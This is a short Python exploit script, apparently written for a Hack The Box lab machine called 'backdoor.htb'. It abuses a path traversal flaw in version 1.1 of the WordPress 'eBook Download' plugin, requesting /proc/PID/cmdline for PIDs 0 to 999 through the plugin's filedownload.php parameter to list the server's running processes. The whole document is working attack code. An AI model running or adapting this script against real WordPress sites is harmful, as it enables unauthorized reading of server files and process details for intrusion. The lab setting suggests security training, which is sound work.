import requests
for i in range(0, 1000):
        r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline") #exploit path traversal vulnerability in wordpress plugin called 'e-book download' version 1.1
        out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()</script>','').replace('\00',' ')) #improve readability
        print(f"Trying PID: {i}")
        if len(out)>1:
                print("PID"+str(i)+" : "+out)
                print()
